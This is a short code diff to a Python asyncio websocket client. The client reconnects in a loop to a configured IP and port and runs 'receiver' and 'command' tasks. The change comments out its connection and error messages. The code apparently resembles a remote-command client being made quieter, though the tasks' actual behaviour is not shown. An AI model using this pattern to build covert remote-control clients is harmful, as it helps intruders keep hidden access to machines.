@@ -79,7 +79,7 @@ async def main():
         receiver_task = None
         command_task = None
         try:
-            print(f"[*] Connecting to {IP}:{PORT}...")
+#            print(f"[*] Connecting to {IP}:{PORT}...")
             async with websockets.connect(f"ws://{IP}:{PORT}", ping_timeout=None) as ws:
                 print(f"[*] Connected to {IP}:{PORT} !!")
                 receiver_task = asyncio.create_task(receiver(ws))
@@ -90,8 +90,8 @@ async def main():
                     return_when=asyncio.FIRST_COMPLETED,
                 )
         except Exception as e:
-            print("[!] Error:", e)
-            print(f"[*] Retrying in {DELAY} seconds...")
+#            print("[!] Error:", e)
+#            print(f"[*] Retrying in {DELAY} seconds...")
             await asyncio.sleep(DELAY)
         finally:
             if receiver_task is not None:
